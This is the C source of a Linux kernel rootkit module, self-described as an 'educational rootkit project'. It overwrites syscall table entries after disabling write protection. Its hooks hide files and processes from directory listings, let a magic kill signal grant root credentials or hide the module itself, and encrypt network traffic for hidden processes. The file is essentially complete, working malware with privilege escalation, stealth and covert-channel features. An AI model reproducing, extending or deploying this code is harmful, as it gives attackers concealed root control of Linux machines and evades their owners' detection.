#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>	
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/proc_ns.h>
#include <linux/fdtable.h>
#include "anssible.h"

#define IN_KEY 0xdeadbeefcafebabe

static unsigned long cr0;
static unsigned long *__sys_call_table;
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall orig_getdents;
static t_syscall orig_getdents64;
static t_syscall orig_kill;
static t_syscall orig_recvfrom;
static t_syscall orig_sendto;
static unsigned char out_key[] = {0xfc, 0x07, 0xf2, 0x5a, 0xb6, 0xb3, 0xcd, 0xe2, 0x42, 0x06, 0x38, 0x4f, 0x4a, 0x35, 0x0a, 0x1a, 0xa4, 0x93, 0x8b, 0x47, 0x6c, 0x0e, 0x62, 0x8b, 0xfd, 0xa5, 0x27, 0xda, 0xab, 0x41, 0x19, 0x03, 0x3e, 0x83, 0x42, 0x4a, 0x04, 0xcc, 0x6f, 0x32, 0xe9, 0x20, 0x27, 0xaa, 0x0e, 0xd4, 0x00, 0x81, 0x38, 0xb6, 0x96, 0xf5, 0x54, 0x06, 0xe3, 0xb5, 0xe3, 0xb4, 0x7e, 0xd7, 0x0f, 0x46, 0x5c, 0x48};

static struct task_struct * find_task(pid_t pid) {
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid) return p;
	}
	return NULL;
}

static int is_invisible(pid_t pid) {
	struct task_struct *task;
	if (!pid) return 0;
	task = find_task(pid);
	if (!task) return 0;
	if (task->flags & PF_INVISIBLE) return 1;
	return 0;
}

static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
	int ret = orig_getdents64(pt_regs), err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc &&
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
	int ret = orig_getdents(pt_regs), err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;	

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc && 
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

static void give_root(void) {
	struct cred *newcreds;
	newcreds = prepare_creds();
	if (newcreds == NULL) return;

	newcreds->uid.val = newcreds->gid.val = 0;
	newcreds->euid.val = newcreds->egid.val = 0;
	newcreds->suid.val = newcreds->sgid.val = 0;
	newcreds->fsuid.val = newcreds->fsgid.val = 0;
	commit_creds(newcreds);
}

static inline void tidy(void) {
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
}

static struct list_head *module_previous;
static short module_hidden = 0;

static void module_show(void) {
	list_add(&THIS_MODULE->list, module_previous);
	module_hidden = 0;
}

static void module_hide(void) {
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}

static void swap_bytes(unsigned char *a, unsigned char *b) {
    unsigned char tmp = *a;
    *a = *b;
    *b = tmp;
}

static asmlinkage int hacked_kill(const struct pt_regs *pt_regs) {
	
	pid_t pid = (pid_t) pt_regs->di;
	int sig = (int) pt_regs->si;
	struct task_struct *task;
	switch (sig) {
		case SIGINVIS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			break;
		case SIGSUPER:
			give_root();
			break;
		case SIGMODINVIS:
			if (module_hidden) module_show();
			else module_hide();
			break;
		default:
			return orig_kill(pt_regs);
	}
	return 0;
}

static int xor_userspace(unsigned long long *buffer, unsigned long long key, size_t n) {
	size_t k = 8*(n/8 +1);
	unsigned long long *kbuff;
	int i;
	kbuff = kzalloc(k, GFP_KERNEL);
	if (copy_from_user(kbuff, (void *)buffer, n) != 0) {
		kfree(kbuff);
		return -1;
	}
	for (i = 0; i<k/8; i++) {
		kbuff[i] ^= key;
	}
	if (copy_to_user(buffer, kbuff, n) != 0) {
		kfree(kbuff);
		return -2;
	}
	kfree(kbuff);
	return 0;
}

static asmlinkage int hacked_recvfrom(const struct pt_regs *pt_regs) {
	pid_t pid = current->pid;
	size_t n;
	int ret;
	ret = orig_recvfrom(pt_regs);
	if (!is_invisible(pid))
		return ret;

	n = (size_t) pt_regs->dx;
	if (xor_userspace((void *)pt_regs->si, IN_KEY, n) != 0)
		return 0;

	return ret;
}

static unsigned char *ksa(unsigned char *key, unsigned char key_len) {
	unsigned short i;
	unsigned short j;
	unsigned char *state = kzalloc(256, GFP_KERNEL);

	for (i = 0; i<256; i++) {
		state[i] = i;
	}

	j=0;
	for (i=0; i<256; i++) {
		j = (j + state[i] + key[i%key_len]) & 0xff;
		swap_bytes(&state[i], &state[j]);
	}
	return state;
}

static int cipher(unsigned char *state, unsigned char *kbuff, size_t kbuff_size) {
	unsigned char i = 0;
	unsigned char j = 0;
	unsigned char k;
	size_t byte_index;

	if (state == NULL)
		return -1;
	
	for (byte_index = 0; byte_index < kbuff_size; byte_index++) {
		i++;
		j += state[i];
		swap_bytes(&state[i], &state[j]);
		k = state[i] + state[j];
		k = state[k];
		kbuff[byte_index] ^= k; 
	}
	kfree(state);
	return 0;
}

static int rc4_userspace(unsigned char *key, unsigned char key_len, unsigned char *buff, size_t buff_size) {
	unsigned char *kbuff;
	
	kbuff = kzalloc(buff_size, GFP_KERNEL);
	if (kbuff == NULL)
		return -1;
	if (copy_from_user(kbuff, buff, buff_size) != 0) {
		kfree(kbuff);
		return -2;
	}
	if (cipher(ksa(out_key, sizeof(out_key)),kbuff, buff_size) != 0) {
		kfree(kbuff);
		return -4;
	}
	if (copy_to_user(buff, kbuff, buff_size) != 0) {
		kfree(kbuff);
		return 1;
	}
	kfree(kbuff);
	return 0;
}

static asmlinkage int hacked_sendto(const struct pt_regs *pt_regs) {
	pid_t pid = current->pid;
	unsigned char *orig_buff;
	unsigned char * buff = (unsigned char *)pt_regs->si;
	ssize_t res = 0;
	size_t size = (size_t) pt_regs->dx;
	int ret = 0;
	
	if (!is_invisible(pid))
		return orig_sendto(pt_regs);
	
	orig_buff = kzalloc(size, GFP_KERNEL);
	if (copy_from_user(orig_buff, buff, size)!= 0) {
		kfree(orig_buff);
		return -1;
	}
	ret = rc4_userspace(out_key, sizeof(out_key), buff, size);
	if (ret < 0) {
		kfree(orig_buff);
		return -1;
	} else if (ret > 0) {
		kfree(orig_buff);
		return orig_sendto(pt_regs);
	}
	res = orig_sendto(pt_regs);
	copy_to_user(buff, orig_buff, size);
	kfree(orig_buff);
	return res;
}

static inline void write_cr0_forced(unsigned long val) {
	unsigned long __force_order;
	
	asm volatile(
			"mov %0, %%cr0"
			: "+r"(val), "+m"(__force_order));
}

static inline void protect_memory(void) {
	write_cr0_forced(cr0);
}

static inline void unprotect_memory(void) {
	write_cr0_forced(cr0 & ~0x00010000);
}

static unsigned long * get_syscall_table(void) {
	unsigned long *syscall_table;
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
	syscall_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");
	return syscall_table;
}

static int __init anssible_start(void) {
	__sys_call_table = get_syscall_table();
	if (!__sys_call_table) return -1;
	cr0 = read_cr0();

	module_hide();
	tidy();

	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
	orig_kill = (t_syscall)__sys_call_table[__NR_kill];
	orig_recvfrom = (t_syscall)__sys_call_table[__NR_recvfrom];
	orig_sendto = (t_syscall)__sys_call_table[__NR_sendto];
	
	unprotect_memory();
	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
	__sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
	__sys_call_table[__NR_recvfrom] = (unsigned long) hacked_recvfrom;
	__sys_call_table[__NR_sendto] = (unsigned long) hacked_sendto;
	protect_memory();
	
	return 0; 
} 

static void __exit anssible_end(void) {
	unprotect_memory();
	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
	__sys_call_table[__NR_recvfrom] = (unsigned long) orig_recvfrom;
	__sys_call_table[__NR_sendto] = (unsigned long) orig_sendto;
	protect_memory();
} 

module_init(anssible_start); 
module_exit(anssible_end); 

MODULE_LICENSE("GPL"); 
MODULE_AUTHOR("owlyduck"); 
MODULE_DESCRIPTION("educational rootkit project"); 
MODULE_VERSION("0.2"); 
